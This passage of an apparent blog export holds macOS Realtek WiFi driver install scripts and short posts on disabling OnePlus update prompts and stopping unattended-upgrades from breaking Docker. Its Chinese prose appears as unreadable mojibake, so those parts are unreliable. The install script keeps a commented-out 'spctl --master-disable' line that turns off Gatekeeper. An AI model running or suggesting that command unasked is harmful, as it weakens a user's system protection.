<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">. /etc/rc.common</span><br><span class="line"></span><br><span class="line">echo &quot;                                                                  &quot;</span><br><span class="line">echo &quot;PreInstall_Driver.command&quot;</span><br><span class="line">FROM=`dirname &quot;$0&quot;`</span><br><span class="line"></span><br><span class="line">echo &quot;Unload Driver&quot;</span><br><span class="line">sudo kextunload /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo kextunload /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo kextunload /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;Removing Driver...&quot;</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU_192.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192SU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192CU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8188EU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192EU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8192DU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RtWlanU*.kext</span><br><span class="line">sudo rm -rf /System/Library/Extensions/RTL8812AU*.kext</span><br><span class="line">sudo rm -rf /Library/Extensions/RTL8812AU*.kext</span><br><span class="line"></span><br><span class="line">echo &quot;Removing Pkg&quot;</span><br><span class="line">sudo rm -rf /Library/Receipts/wlan.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/wlanAc.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192SU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192CU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8188EU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192EU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8192DU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/rtl8812AU4.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/wireless-acNetworkUtility.pkg</span><br><span class="line">sudo rm -rf /Library/Receipts/wirelessNetworkUtility.pkg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;Checking Preferences&quot;</span><br><span class="line"></span><br><span class="line">_PREFERENCE=&quot;/Library/Preferences/SystemConfiguration/preferences.plist&quot;</span><br><span class="line">_NETWORKINTERFACES=&quot;/Library/Preferences/SystemConfiguration/NetworkInterfaces.plist&quot;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Phase 1: Get CurrentSet UUID</span></span><br><span class="line">autoUuid=`/usr/libexec/Plistbuddy -c &quot;Print :Sets&quot; $_PREFERENCE | grep -B1 -m1 Automatic | grep Dict | awk &#x27;&#123; print $1 &#125;&#x27;`</span><br><span class="line">echo autoUuid =$autoUuid</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Phase 2: Get All Services Array</span></span><br><span class="line">NetServicesArray=`/usr/libexec/PlistBuddy -c &quot;Print :NetworkServices&quot; $_PREFERENCE | egrep &#x27;[0-9A-F]&#123;8&#125;-([0-9A-F]&#123;4&#125;-)&#123;3&#125;[0-9A-F]&#123;12&#125;&#x27; -o`</span><br><span class="line">echo NetServicesArray =$NetServicesArray</span><br><span class="line"></span><br><span class="line">for eNetService in $NetServicesArray</span><br><span class="line">do</span><br><span class="line">	echo eNetService =$eNetService</span><br><span class="line">	eIntf=`/usr/libexec/Plistbuddy -c &quot;Print :NetworkServices:$eNetService&quot; $_PREFERENCE | grep -a &quot;DeviceName&quot; | awk &#x27;&#123; print $3 &#125;&#x27;`</span><br><span class="line">	echo eIntf =$eIntf</span><br><span class="line">	bHit=`/usr/libexec/Plistbuddy -c &quot;Print :Interfaces&quot; $_NETWORKINTERFACES | grep -a -A7 &#x27;RtWlanU\|RTL8812AU\|RTL8192CU\|RTL8188EU\|RTL8192EU&#x27; | grep -a &quot;BSD Name&quot;| awk &#x27;&#123; print $4 &#125;&#x27;| grep -aw $eIntf`</span><br><span class="line"></span><br><span class="line"><span class="meta">	#</span><span class="bash"> -z: string is null, that is, has zero length</span></span><br><span class="line"><span class="meta">	#</span><span class="bash"> -n: string is not null</span></span><br><span class="line">	if [ -n &quot;$&#123;bHit&#125;&quot; ]; then</span><br><span class="line">		echo bHit =$bHit</span><br><span class="line"></span><br><span class="line"><span class="meta">		#</span><span class="bash"> Phase 3: Check interface down : Sets:<span class="variable">$autoUuid</span>:Network:Service:UUID</span></span><br><span class="line">		bIfconfigDown=`/usr/libexec/Plistbuddy -c &quot;Print :Sets:$autoUuid:Network:Service:$eNetService&quot; $_PREFERENCE`</span><br><span class="line"></span><br><span class="line">		if [ -z &quot;$&#123;bIfconfigDown&#125;&quot; ]; then</span><br><span class="line">			echo bIfconfigDown=$bIfconfigDown</span><br><span class="line"></span><br><span class="line"><span class="meta">			#</span><span class="bash"> Phase 4: Remove NetworksServices:UUID</span></span><br><span class="line">			sudo /usr/libexec/PlistBuddy -c &quot;delete :NetworkServices:$eNetService dict&quot; $_PREFERENCE</span><br><span class="line">		fi</span><br><span class="line">	fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">version=$( /usr/bin/sw_vers -productVersion )</span><br><span class="line">major=$( awk -F&#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">minor=$( awk -F&#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">patch=$( awk -F&#x27;.&#x27; &#x27;&#123;print $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line"></span><br><span class="line">if [ &quot;$major&quot; -eq 10 ]; then</span><br><span class="line">	echo major =$major</span><br><span class="line"></span><br><span class="line">	if [ &quot;$minor&quot; -ge 11 ]; then</span><br><span class="line"><span class="meta">		#</span><span class="bash"><span class="built_in">echo</span> 10.11~ =<span class="variable">$minor</span></span></span><br><span class="line">		sudo touch /System/Library/Extensions</span><br><span class="line">	fi</span><br><span class="line"></span><br><span class="line"><span class="meta">	#</span><span class="bash"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$minor</span>&quot;</span> -ge 13 ]; <span class="keyword">then</span></span></span><br><span class="line"><span class="meta">		#</span><span class="bash"><span class="built_in">echo</span> 10.13~ =<span class="variable">$minor</span></span></span><br><span class="line"><span class="meta">		#</span><span class="bash">sudo spctl --master -<span class="built_in">disable</span></span></span><br><span class="line"><span class="meta">	#</span><span class="bash"><span class="keyword">fi</span></span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;PreInstall_Driver Complete.&quot;%</span><br></pre></td></tr></table></figure>

<p><strong>postinstall</strong> :</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">. /etc/rc.common</span><br><span class="line"></span><br><span class="line">echo &quot;PostInstall_Driver.command&quot;</span><br><span class="line"></span><br><span class="line">version=$( /usr/bin/sw_vers -productVersion )</span><br><span class="line">major=$( awk -F&#x27;.&#x27; &#x27;&#123;print $1&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">minor=$( awk -F&#x27;.&#x27; &#x27;&#123;print $2&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line">patch=$( awk -F&#x27;.&#x27; &#x27;&#123;print $3&#125;&#x27; &lt;&lt;&lt; &quot;$&#123;version&#125;&quot; )</span><br><span class="line"></span><br><span class="line">sudo chmod -R 755 /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo chmod -R 755 /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo chmod -R 755 /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line"></span><br><span class="line">sleep 1</span><br><span class="line"></span><br><span class="line">sudo chown -R root:wheel /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo chown -R root:wheel /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line">sudo chown -R root:wheel /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo chmod 644 /System/Library/Extensions/RtWlanU.kext/Contents/Info.plist</span><br><span class="line">sudo chmod 644 /System/Library/Extensions/RtWlanU1827.kext/Contents/Info.plist</span><br><span class="line">sudo chmod 644 /System/Library/Extensions/RtWlanDisk.kext/Contents/Info.plist</span><br><span class="line"></span><br><span class="line">if [ &quot;$minor&quot; -ge 9 ]; then</span><br><span class="line"><span class="meta">		#</span><span class="bash"><span class="built_in">echo</span> 10.9~ =<span class="variable">$minor</span></span></span><br><span class="line"></span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU1827.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanDisk.kext/Contents/_CodeSignature/CodeResources</span><br><span class="line"></span><br><span class="line">elif [ &quot;$minor&quot; -ge 6 ] &amp;&amp; [ &quot;$minor&quot; -le 8 ]; then</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU.kext/Contents/MacOS/RtWlanU</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanU1827.kext/Contents/MacOS/RtWlanU1827</span><br><span class="line">		sudo chmod 644 /System/Library/Extensions/RtWlanDisk.kext/Contents/MacOS/RtWlanDisk</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if [ &quot;$minor&quot; -eq 6 ]; then</span><br><span class="line">	sudo kextcache -v 1 -a i386 -a x86_64 -m /System/Library/Caches/com.apple.kext.caches/Startup/Extensions.mkext /System/Library/Extensions</span><br><span class="line"></span><br><span class="line">elif [ &quot;$minor&quot; -ge 7 ] &amp;&amp; [ &quot;$minor&quot; -le 10 ]; then</span><br><span class="line"></span><br><span class="line">	sudo kextcache -system-prelinked-kernel</span><br><span class="line">	sudo kextcache -system-caches</span><br><span class="line"></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sudo touch /System/Library/Extensions</span><br><span class="line"></span><br><span class="line">sudo kextload /System/Library/Extensions/RtWlanDisk.kext</span><br><span class="line">sudo kextload /System/Library/Extensions/RtWlanU.kext</span><br><span class="line">sudo kextload /System/Library/Extensions/RtWlanU1827.kext</span><br><span class="line"></span><br><span class="line">echo &quot;PostInstall_Driver Complete.&quot;</span><br></pre></td></tr></table></figure>



<h3 id="è§£å‹å·¥å…·ç¨‹åºåŒ…"><a href="#è§£å‹å·¥å…·ç¨‹åºåŒ…" class="headerlink" title="è§£å‹å·¥å…·ç¨‹åºåŒ…"></a>è§£å‹å·¥å…·ç¨‹åºåŒ…</h3><p>åˆ‡æ¢åˆ° RealtekUtility1014.pkg ç›®å½•ï¼ŒåŒç†å¯¹å…¶è¿›è¡Œå®‰è£…ï¼Œå¯ä»¥ä¿®æ”¹é…ç½®ç›¸å…³plistæ–‡ä»¶ï¼ˆå¦‚å…³é—­è‡ªå¯åŠ¨ä¹‹ç±»çš„ï¼‰ã€‚</p>
<p>é‡å¯ä»¥åç»è¿‡æµ‹è¯•ï¼Œè™½ç„¶Utilityç¨‹åºä¼šæŠ¥ä¸€äº›é”™ï¼Œä½†æ˜¯WiFiç½‘å¡å¯ä»¥è¿æ¥å…¶ä»–WiFiã€‚</p>
<p>AWUS051NHv2 ç½‘å¡å’Œ AWUS036ACH åŸç†å·®ä¸å¤š</p>
<h2 id="å…¶ä»–é—®é¢˜"><a href="#å…¶ä»–é—®é¢˜" class="headerlink" title="å…¶ä»–é—®é¢˜"></a>å…¶ä»–é—®é¢˜</h2><ol>
<li>AWUS036ACH ç½‘å¡å¯¹äº wpa-tls çš„çƒ­ç‚¹æ— æ³•è¯»å– keychains é‡Œçš„å¯†é’¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</li>
<li>AWUS051NHv2 ç½‘å¡çš„é©±åŠ¨ç¨‹åºæ²¡é—®é¢˜ï¼ŒUtility ç¨‹åºæ˜¯32ä½çš„ï¼Œæ–° macOS æ²¡æ³•ç”¨ï¼Œå¯ä»¥é€šè¿‡ <code>ifconfig en12 up</code> ç­‰æ–¹æ³•æŠŠç½‘å¡å¯åŠ¨èµ·æ¥ï¼Œé»˜è®¤upåä¼šè‡ªåŠ¨è¿æ¥å·²ä¿å­˜çš„ wpa-tls ä¼ä¸šçƒ­ç‚¹</li>
</ol>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>macos</tag>
        <tag>WiFi</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€åŠ  Oneplus 7 pro ç¦ç”¨ç³»ç»Ÿæ›´æ–°æé†’</title>
    <url>/2021/04/24/2021-04-24/</url>
    <content><![CDATA[<p>æ‰‹å¤´çš„ä¸€åŠ 7proæœ€è¿‘æ€»æ˜¯æé†’å‡çº§ColorOS11ï¼Œç›®å‰nethunteråªæ”¯æŒåˆ°Android 10ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¿æŒä½ç‰ˆæœ¬ç³»ç»Ÿç¦ç”¨æ‰å‡çº§æé†’ã€‚</p>
<a id="more"></a>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">test@One-Mix3-Pro:~$ adb shell</span><br><span class="line">kali:/ $ su</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ç¦ç”¨ opbackup appï¼Œéœ€root</span></span><br><span class="line">kali:/ # pm disable --user 0 com.oneplus.opbackup</span><br><span class="line">Package com.oneplus.opbackup new state: disabled</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¸…é™¤è®¾ç½®ä¸­ç³»ç»Ÿæ›´æ–°èœå•æ—çš„çº¢ç‚¹</span></span><br><span class="line">kali:/ # pm clear com.oneplus.opbackup</span><br><span class="line">Success</span><br><span class="line">kali:/ #</span><br></pre></td></tr></table></figure>
<p>xda è®ºå›çœ‹åˆ°å¦ä¸€ç§æ–¹æ³•(æœªå®æµ‹)ï¼Œå°†<code>/system/app/OPBACKUP/OPBackup.apk</code>é‡å‘½åä¸º<code>OPBackup.apk.bak</code>ã€‚</p>
]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>tips</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>dockeråœæ­¢æœåŠ¡åŸå› æ’æŸ¥ï¼ŒUbuntuè‡ªåŠ¨æ›´æ–°æœåŠ¡åŠ ç™½</title>
    <url>/2021/07/31/2021-07-31/</url>
    <content><![CDATA[<p>æœåŠ¡å™¨443ç«¯å£çªç„¶åœæ­¢æœåŠ¡ï¼Œç™»ä¸Šå»çœ‹dockeråœæ­¢äº†ï¼Œåœ¨/var/logä¸‹grep dockerï¼ŒæŸ¥çœ‹<code>/var/log/syslog.*</code>ã€<code>/var/log/unattended-upgrades/unattended-upgrades.log</code>ã€<code>/var/log/apt/history.log</code>å‘ç°æ˜¯å› ä¸ºunattended-upgradesæœåŠ¡å‡çº§å¯¼è‡´çš„-_-!</p>
<a id="more"></a>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> 87 Start-Date: 2021-07-27  06:42:24</span><br><span class="line"> 88 Commandline: &#x2F;usr&#x2F;bin&#x2F;unattended-upgrade</span><br><span class="line"> 89 Upgrade: docker-doc:amd64 (19.03.6-0ubuntu1~18.04.2, 20.10.2-0ubuntu1~18.04.3)</span><br><span class="line"> 90 End-Date: 2021-07-27  06:42:33</span><br><span class="line"> 91</span><br><span class="line"> 92 Start-Date: 2021-07-27  06:42:41</span><br><span class="line"> 93 Commandline: &#x2F;usr&#x2F;bin&#x2F;unattended-upgrade</span><br><span class="line"> 94 Upgrade: docker.io:amd64 (19.03.6-0ubuntu1~18.04.2, 20.10.2-0ubuntu1~18.04.3)</span><br><span class="line"> 95 End-Date: 2021-07-27  06:43:15</span><br><span class="line">...</span><br><span class="line">117 Start-Date: 2021-07-27  06:43:52</span><br><span class="line">118 Commandline: &#x2F;usr&#x2F;bin&#x2F;unattended-upgrade</span><br><span class="line">119 Upgrade: runc:amd64 (1.0.0~rc93-0ubuntu1~18.04.2, 1.0.0~rc95-0ubuntu1~18.04.2)</span><br><span class="line">120 End-Date: 2021-07-27  06:43:54</span><br><span class="line">...</span><br><span class="line">127 Start-Date: 2021-07-27  06:44:04</span><br><span class="line">128 Commandline: &#x2F;usr&#x2F;bin&#x2F;unattended-upgrade</span><br><span class="line">129 Upgrade: containerd:amd64 (1.3.3-0ubuntu1~18.04.2, 1.5.2-0ubuntu1~18.04.2)</span><br><span class="line">130 End-Date: 2021-07-27  06:44:16</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹<code>/etc/apt/apt.conf.d/50unattended-upgrades</code>å¯¹dockerç›¸å…³çš„è½¯ä»¶åŒ…åŠ ç™½</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">20 &#x2F;&#x2F; List of packages to not update (regexp are supported)</span><br><span class="line">21 Unattended-Upgrade::Package-Blacklist &#123;</span><br><span class="line">22 &#x2F;&#x2F;  &quot;vim&quot;;</span><br><span class="line">23 &#x2F;&#x2F;  &quot;libc6&quot;;</span><br><span class="line">24 &#x2F;&#x2F;  &quot;libc6-dev&quot;;</span><br><span class="line">25 &#x2F;&#x2F;  &quot;libc6-i686&quot;;</span><br><span class="line">26     &quot;docker*&quot;;</span><br><span class="line">27     &quot;containerd&quot;;</span><br><span class="line">28     &quot;runc&quot;;</span><br><span class="line">29 &#125;;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…é…ç½®aptå°†è½¯ä»¶åŒ…è®¾ç½®ä¸ºä¸æ›´æ–°ï¼ˆæ‰‹åŠ¨upgradeä¹Ÿä¸æ›´æ–°ï¼Œä¸æ¨èï¼‰</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">ä½¿ç”¨ apt</span></span><br><span class="line">apt-mark hold package_name  # æ¢å¤ apt-mark unhold package_name </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ä½¿ç”¨ dpkg</span></span><br><span class="line">echo &quot;package_name hold&quot; | sudo dpkg --set-selections  # æ¢å¤ echo &quot;package_name install&quot; | sudo dpkg --set-selections</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">ä½¿ç”¨ aptitude</span></span><br><span class="line">aptitude hold package_name	# æ¢å¤ aptitude unhold package_name </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">æŸ¥çœ‹å·²ç»holdçš„è½¯ä»¶åŒ…</span></span><br><span class="line">dpkg --get-selections | grep &quot;hold&quot; </span><br></pre></td></tr></table></figure>

<p>æˆ–è€…é‡æ–°é…ç½®<code>unattended-upgrade</code>æœåŠ¡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure unattended-upgrades</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç›´æ¥å…³é—­<code>unattended-upgrade</code>æœåŠ¡</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status apt-daily-upgrade.timer</span><br><span class="line">systemctl stop apt-daily-upgrade.timer</span><br><span class="line">systemctl disable --now apt-daily-upgrade.timer</span><br><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…å¸è½½</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt remove unattended-upgrades</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>tech</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>vps</tag>
        <tag>tips</tag>
        <tag>ubuntu</tag>
        <tag>environment</tag>
      </tags>
  </entry>
</search>
